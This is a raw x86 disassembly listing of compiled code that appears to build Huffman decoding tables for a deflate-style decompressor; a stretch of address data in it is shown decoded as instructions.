  40721c:	33 ff                	xor    %edi,%edi
  40721e:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  407224:	8b 45 08             	mov    0x8(%ebp),%eax
  407227:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  40722d:	89 78 04             	mov    %edi,0x4(%eax)
  407230:	e9 98 f6 ff ff       	jmp    0x4068cd
  407235:	33 ff                	xor    %edi,%edi
  407237:	e9 79 f6 ff ff       	jmp    0x4068b5
  40723c:	33 ff                	xor    %edi,%edi
  40723e:	47                   	inc    %edi
  40723f:	e9 71 f6 ff ff       	jmp    0x4068b5
  407244:	41                   	inc    %ecx
  407245:	6e                   	outsb  %ds:(%esi),(%dx)
  407246:	40                   	inc    %eax
  407247:	00 54 6e 40          	add    %dl,0x40(%esi,%ebp,2)
  40724b:	00 ea                	add    %ch,%dl
  40724d:	6e                   	outsb  %ds:(%esi),(%dx)
  40724e:	40                   	inc    %eax
  40724f:	00 3b                	add    %bh,(%ebx)
  407251:	6f                   	outsl  %ds:(%esi),(%dx)
  407252:	40                   	inc    %eax
  407253:	00 b9 6f 40 00 fd    	add    %bh,-0x2ffbf91(%ecx)
  407259:	6f                   	outsl  %ds:(%esi),(%dx)
  40725a:	40                   	inc    %eax
  40725b:	00 03                	add    %al,(%ebx)
  40725d:	71 40                	jno    0x40729f
  40725f:	00 b4 71 40 00 6d 68 	add    %dh,0x686d0040(%ecx,%esi,2)
  407266:	40                   	inc    %eax
  407267:	00 02                	add    %al,(%edx)
  407269:	6a 40                	push   $0x40
  40726b:	00 27                	add    %ah,(%edi)
  40726d:	6a 40                	push   $0x40
  40726f:	00 35 6b 40 00 74    	add    %dh,0x7400406b
  407275:	6b 40 00 57          	imul   $0x57,0x0(%eax),%eax
  407279:	6d                   	insl   (%dx),%es:(%edi)
  40727a:	40                   	inc    %eax
  40727b:	00 ac 68 40 00 c2 71 	add    %ch,0x71c20040(%eax,%ebp,2)
  407282:	40                   	inc    %eax
  407283:	00 53 56             	add    %dl,0x56(%ebx)
  407286:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40728a:	57                   	push   %edi
  40728b:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  407291:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  407297:	3b fb                	cmp    %ebx,%edi
  407299:	76 06                	jbe    0x4072a1
  40729b:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  4072a1:	8b 46 0c             	mov    0xc(%esi),%eax
  4072a4:	2b df                	sub    %edi,%ebx
  4072a6:	3b d8                	cmp    %eax,%ebx
  4072a8:	72 02                	jb     0x4072ac
  4072aa:	8b d8                	mov    %eax,%ebx
  4072ac:	53                   	push   %ebx
  4072ad:	57                   	push   %edi
  4072ae:	ff 76 08             	push   0x8(%esi)
  4072b1:	2b c3                	sub    %ebx,%eax
  4072b3:	89 46 0c             	mov    %eax,0xc(%esi)
  4072b6:	e8 b0 ea ff ff       	call   0x405d6b
  4072bb:	01 5e 08             	add    %ebx,0x8(%esi)
  4072be:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  4072c4:	03 fb                	add    %ebx,%edi
  4072c6:	3b f8                	cmp    %eax,%edi
  4072c8:	75 16                	jne    0x4072e0
  4072ca:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  4072d0:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  4072d6:	75 b9                	jne    0x407291
  4072d8:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  4072de:	eb b1                	jmp    0x407291
  4072e0:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  4072e6:	5f                   	pop    %edi
  4072e7:	5e                   	pop    %esi
  4072e8:	5b                   	pop    %ebx
  4072e9:	c2 04 00             	ret    $0x4
  4072ec:	55                   	push   %ebp
  4072ed:	8b ec                	mov    %esp,%ebp
  4072ef:	81 ec ec 00 00 00    	sub    $0xec,%esp
  4072f5:	53                   	push   %ebx
  4072f6:	56                   	push   %esi
  4072f7:	8b 75 0c             	mov    0xc(%ebp),%esi
  4072fa:	57                   	push   %edi
  4072fb:	6a 10                	push   $0x10
  4072fd:	33 c0                	xor    %eax,%eax
  4072ff:	59                   	pop    %ecx
  407300:	8d 7d 90             	lea    -0x70(%ebp),%edi
  407303:	f3 ab                	rep stos %eax,%es:(%edi)
  407305:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407308:	8b d6                	mov    %esi,%edx
  40730a:	8b 01                	mov    (%ecx),%eax
  40730c:	83 c1 04             	add    $0x4,%ecx
  40730f:	8d 44 85 90          	lea    -0x70(%ebp,%eax,4),%eax
  407313:	ff 00                	incl   (%eax)
  407315:	4a                   	dec    %edx
  407316:	75 f2                	jne    0x40730a
  407318:	39 75 90             	cmp    %esi,-0x70(%ebp)
  40731b:	75 13                	jne    0x407330
  40731d:	8b 45 1c             	mov    0x1c(%ebp),%eax
  407320:	83 20 00             	andl   $0x0,(%eax)
  407323:	8b 45 20             	mov    0x20(%ebp),%eax
  407326:	83 20 00             	andl   $0x0,(%eax)
  407329:	33 c0                	xor    %eax,%eax
  40732b:	e9 f0 02 00 00       	jmp    0x407620
  407330:	8b 75 20             	mov    0x20(%ebp),%esi
  407333:	33 db                	xor    %ebx,%ebx
  407335:	43                   	inc    %ebx
  407336:	6a 0f                	push   $0xf
  407338:	8b 3e                	mov    (%esi),%edi
  40733a:	8b cb                	mov    %ebx,%ecx
  40733c:	89 7d 20             	mov    %edi,0x20(%ebp)
  40733f:	5a                   	pop    %edx
  407340:	33 c0                	xor    %eax,%eax
  407342:	39 44 8d 90          	cmp    %eax,-0x70(%ebp,%ecx,4)
  407346:	75 05                	jne    0x40734d
  407348:	41                   	inc    %ecx
  407349:	3b ca                	cmp    %edx,%ecx
  40734b:	76 f3                	jbe    0x407340
  40734d:	3b f9                	cmp    %ecx,%edi
  40734f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407352:	73 03                	jae    0x407357
  407354:	89 4d 20             	mov    %ecx,0x20(%ebp)
  407357:	39 44 95 90          	cmp    %eax,-0x70(%ebp,%edx,4)
  40735b:	75 03                	jne    0x407360
  40735d:	4a                   	dec    %edx
  40735e:	75 f7                	jne    0x407357
  407360:	39 55 20             	cmp    %edx,0x20(%ebp)
  407363:	89 55 e8             	mov    %edx,-0x18(%ebp)
  407366:	76 03                	jbe    0x40736b
  407368:	89 55 20             	mov    %edx,0x20(%ebp)
  40736b:	8b 7d 20             	mov    0x20(%ebp),%edi
  40736e:	89 3e                	mov    %edi,(%esi)
  407370:	d3 e3                	shl    %cl,%ebx
  407372:	eb 0d                	jmp    0x407381
  407374:	2b 5c 8d 90          	sub    -0x70(%ebp,%ecx,4),%ebx
  407378:	0f 88 9f 02 00 00    	js     0x40761d
  40737e:	41                   	inc    %ecx
  40737f:	03 db                	add    %ebx,%ebx
  407381:	3b ca                	cmp    %edx,%ecx
  407383:	72 ef                	jb     0x407374
  407385:	8b f2                	mov    %edx,%esi
  407387:	c1 e6 02             	shl    $0x2,%esi
  40738a:	8d 4c 35 90          	lea    -0x70(%ebp,%esi,1),%ecx
  40738e:	8b 39                	mov    (%ecx),%edi
  407390:	2b df                	sub    %edi,%ebx
  407392:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  407395:	0f 88 82 02 00 00    	js     0x40761d
  40739b:	03 fb                	add    %ebx,%edi
  40739d:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  4073a3:	89 39                	mov    %edi,(%ecx)
  4073a5:	33 c9                	xor    %ecx,%ecx
  4073a7:	4a                   	dec    %edx
  4073a8:	74 13                	je     0x4073bd
  4073aa:	33 ff                	xor    %edi,%edi
  4073ac:	03 4c 3d 94          	add    -0x6c(%ebp,%edi,1),%ecx
  4073b0:	83 c7 04             	add    $0x4,%edi
  4073b3:	4a                   	dec    %edx
  4073b4:	89 8c 3d 54 ff ff ff 	mov    %ecx,-0xac(%ebp,%edi,1)
  4073bb:	75 ef                	jne    0x4073ac
  4073bd:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4073c0:	33 ff                	xor    %edi,%edi
  4073c2:	8b 0b                	mov    (%ebx),%ecx
  4073c4:	83 c3 04             	add    $0x4,%ebx
  4073c7:	3b c8                	cmp    %eax,%ecx
  4073c9:	74 13                	je     0x4073de
  4073cb:	8d 8c 8d 50 ff ff ff 	lea    -0xb0(%ebp,%ecx,4),%ecx
  4073d2:	8b 11                	mov    (%ecx),%edx
  4073d4:	89 3c 95 70 a1 46 00 	mov    %edi,0x46a170(,%edx,4)
  4073db:	42                   	inc    %edx
  4073dc:	89 11                	mov    %edx,(%ecx)
  4073de:	47                   	inc    %edi
  4073df:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4073e2:	72 de                	jb     0x4073c2
  4073e4:	8b 8c 35 50 ff ff ff 	mov    -0xb0(%ebp,%esi,1),%ecx
  4073eb:	8b 5d 20             	mov    0x20(%ebp),%ebx
  4073ee:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  4073f2:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4073f6:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4073f9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4073fc:	f7 db                	neg    %ebx
  4073fe:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  407401:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407404:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40740a:	c7 45 e0 70 a1 46 00 	movl   $0x46a170,-0x20(%ebp)
  407411:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  407417:	0f 8f f3 01 00 00    	jg     0x407610
  40741d:	8d 51 ff             	lea    -0x1(%ecx),%edx
  407420:	8d 4c 8d 90          	lea    -0x70(%ebp,%ecx,4),%ecx
  407424:	89 55 d8             	mov    %edx,-0x28(%ebp)
  407427:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40742a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40742d:	8b 31                	mov    (%ecx),%esi
  40742f:	85 f6                	test   %esi,%esi
  407431:	0f 84 c3 01 00 00    	je     0x4075fa
  407437:	eb 03                	jmp    0x40743c
  407439:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40743c:	8b 4d 20             	mov    0x20(%ebp),%ecx
  40743f:	4e                   	dec    %esi
  407440:	03 cb                	add    %ebx,%ecx
  407442:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  407445:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407448:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40744b:	0f 8e cc 00 00 00    	jle    0x40751d
  407451:	46                   	inc    %esi
  407452:	89 75 f0             	mov    %esi,-0x10(%ebp)
  407455:	8b 75 e8             	mov    -0x18(%ebp),%esi
  407458:	ff 45 f4             	incl   -0xc(%ebp)
  40745b:	2b 75 ec             	sub    -0x14(%ebp),%esi
  40745e:	3b 75 20             	cmp    0x20(%ebp),%esi
  407461:	76 03                	jbe    0x407466
  407463:	8b 75 20             	mov    0x20(%ebp),%esi
  407466:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407469:	33 d2                	xor    %edx,%edx
  40746b:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  40746e:	42                   	inc    %edx
  40746f:	d3 e2                	shl    %cl,%edx
  407471:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  407474:	76 23                	jbe    0x407499
  407476:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  407479:	83 c8 ff             	or     $0xffffffff,%eax
  40747c:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40747f:	03 d0                	add    %eax,%edx
  407481:	3b ce                	cmp    %esi,%ecx
  407483:	73 14                	jae    0x407499
  407485:	eb 0d                	jmp    0x407494
  407487:	83 c7 04             	add    $0x4,%edi
  40748a:	03 d2                	add    %edx,%edx
  40748c:	8b 07                	mov    (%edi),%eax
  40748e:	3b d0                	cmp    %eax,%edx
  407490:	76 07                	jbe    0x407499
  407492:	2b d0                	sub    %eax,%edx
  407494:	41                   	inc    %ecx
  407495:	3b ce                	cmp    %esi,%ecx
  407497:	72 ee                	jb     0x407487
  407499:	8b 55 28             	mov    0x28(%ebp),%edx
  40749c:	33 c0                	xor    %eax,%eax
  40749e:	40                   	inc    %eax
  40749f:	8b 12                	mov    (%edx),%edx
  4074a1:	d3 e0                	shl    %cl,%eax
  4074a3:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4074a6:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  4074a9:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  4074af:	0f 87 68 01 00 00    	ja     0x40761d
  4074b5:	8b 45 24             	mov    0x24(%ebp),%eax
  4074b8:	8d 04 90             	lea    (%eax,%edx,4),%eax
  4074bb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4074be:	8d b4 95 14 ff ff ff 	lea    -0xec(%ebp,%edx,4),%esi
  4074c5:	8b 55 28             	mov    0x28(%ebp),%edx
  4074c8:	89 3a                	mov    %edi,(%edx)
  4074ca:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4074cd:	85 d2                	test   %edx,%edx
  4074cf:	89 06                	mov    %eax,(%esi)
  4074d1:	74 31                	je     0x407504
  4074d3:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4074d6:	8b 76 fc             	mov    -0x4(%esi),%esi
  4074d9:	89 bc 95 50 ff ff ff 	mov    %edi,-0xb0(%ebp,%edx,4)
  4074e0:	8a 55 20             	mov    0x20(%ebp),%dl
  4074e3:	88 55 09             	mov    %dl,0x9(%ebp)
  4074e6:	88 4d 08             	mov    %cl,0x8(%ebp)
  4074e9:	8b d7                	mov    %edi,%edx
  4074eb:	8b cb                	mov    %ebx,%ecx
  4074ed:	d3 ea                	shr    %cl,%edx
  4074ef:	8b c8                	mov    %eax,%ecx
  4074f1:	2b ce                	sub    %esi,%ecx
  4074f3:	c1 f9 02             	sar    $0x2,%ecx
  4074f6:	2b ca                	sub    %edx,%ecx
  4074f8:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  4074fc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4074ff:	89 0c 96             	mov    %ecx,(%esi,%edx,4)
  407502:	eb 05                	jmp    0x407509
  407504:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  407507:	89 01                	mov    %eax,(%ecx)
  407509:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40750c:	8b d9                	mov    %ecx,%ebx
  40750e:	03 4d 20             	add    0x20(%ebp),%ecx
  407511:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407514:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407517:	0f 8f 38 ff ff ff    	jg     0x407455
  40751d:	8a 4d fc             	mov    -0x4(%ebp),%cl
  407520:	8b 75 e0             	mov    -0x20(%ebp),%esi
  407523:	2a cb                	sub    %bl,%cl
  407525:	88 4d 09             	mov    %cl,0x9(%ebp)
  407528:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40752b:	8d 0c 8d 70 a1 46 00 	lea    0x46a170(,%ecx,4),%ecx
  407532:	3b f1                	cmp    %ecx,%esi
  407534:	72 06                	jb     0x40753c
  407536:	c6 45 08 c0          	movb   $0xc0,0x8(%ebp)
  40753a:	eb 43                	jmp    0x40757f
  40753c:	8b 0e                	mov    (%esi),%ecx
  40753e:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  407541:	73 1c                	jae    0x40755f
  407543:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407549:	0f 92 c1             	setb   %cl
  40754c:	fe c9                	dec    %cl
  40754e:	83 e1 60             	and    $0x60,%ecx
  407551:	88 4d 08             	mov    %cl,0x8(%ebp)
  407554:	66 8b 0e             	mov    (%esi),%cx
  407557:	83 c6 04             	add    $0x4,%esi
  40755a:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40755d:	eb 1c                	jmp    0x40757b
  40755f:	2b 4d 10             	sub    0x10(%ebp),%ecx
  407562:	8b 55 18             	mov    0x18(%ebp),%edx
  407565:	03 c9                	add    %ecx,%ecx
  407567:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  40756a:	80 c2 50             	add    $0x50,%dl
  40756d:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  407571:	88 55 08             	mov    %dl,0x8(%ebp)
  407574:	8b 55 14             	mov    0x14(%ebp),%edx
  407577:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  40757b:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  40757f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407582:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407585:	33 ff                	xor    %edi,%edi
  407587:	2b cb                	sub    %ebx,%ecx
  407589:	47                   	inc    %edi
  40758a:	8b f7                	mov    %edi,%esi
  40758c:	d3 e6                	shl    %cl,%esi
  40758e:	8b cb                	mov    %ebx,%ecx
  407590:	d3 ea                	shr    %cl,%edx
  407592:	eb 08                	jmp    0x40759c
  407594:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407597:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  40759a:	03 d6                	add    %esi,%edx
  40759c:	3b 55 dc             	cmp    -0x24(%ebp),%edx
  40759f:	72 f3                	jb     0x407594
  4075a1:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4075a4:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4075a7:	8b d7                	mov    %edi,%edx
  4075a9:	d3 e2                	shl    %cl,%edx
  4075ab:	eb 04                	jmp    0x4075b1
  4075ad:	33 f2                	xor    %edx,%esi
  4075af:	d1 ea                	shr    $1,%edx
  4075b1:	85 d6                	test   %edx,%esi
  4075b3:	75 f8                	jne    0x4075ad
  4075b5:	8b cf                	mov    %edi,%ecx
  4075b7:	33 f2                	xor    %edx,%esi
  4075b9:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4075bc:	8b cb                	mov    %ebx,%ecx
  4075be:	8b d7                	mov    %edi,%edx
  4075c0:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4075c3:	d3 e2                	shl    %cl,%edx
  4075c5:	4a                   	dec    %edx
  4075c6:	23 d6                	and    %esi,%edx
  4075c8:	8b ca                	mov    %edx,%ecx
  4075ca:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4075cd:	3b 8c 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%ecx
  4075d4:	74 1a                	je     0x4075f0
  4075d6:	2b 5d 20             	sub    0x20(%ebp),%ebx
  4075d9:	8b f7                	mov    %edi,%esi
  4075db:	4a                   	dec    %edx
  4075dc:	8b cb                	mov    %ebx,%ecx
  4075de:	d3 e6                	shl    %cl,%esi
  4075e0:	4e                   	dec    %esi
  4075e1:	23 75 f8             	and    -0x8(%ebp),%esi
  4075e4:	3b b4 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%esi
  4075eb:	75 e9                	jne    0x4075d6
  4075ed:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4075f0:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  4075f4:	0f 85 3f fe ff ff    	jne    0x407439
  4075fa:	ff 45 fc             	incl   -0x4(%ebp)
  4075fd:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  407601:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407604:	ff 45 d8             	incl   -0x28(%ebp)
  407607:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  40760a:	0f 8e 1a fe ff ff    	jle    0x40742a
  407610:	33 c0                	xor    %eax,%eax
  407612:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  407615:	74 09                	je     0x407620
  407617:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  40761b:	74 03                	je     0x407620
  40761d:	83 c8 ff             	or     $0xffffffff,%eax
  407620:	5f                   	pop    %edi
  407621:	5e                   	pop    %esi
  407622:	5b                   	pop    %ebx
  407623:	c9                   	leave
  407624:	c2 24 00             	ret    $0x24
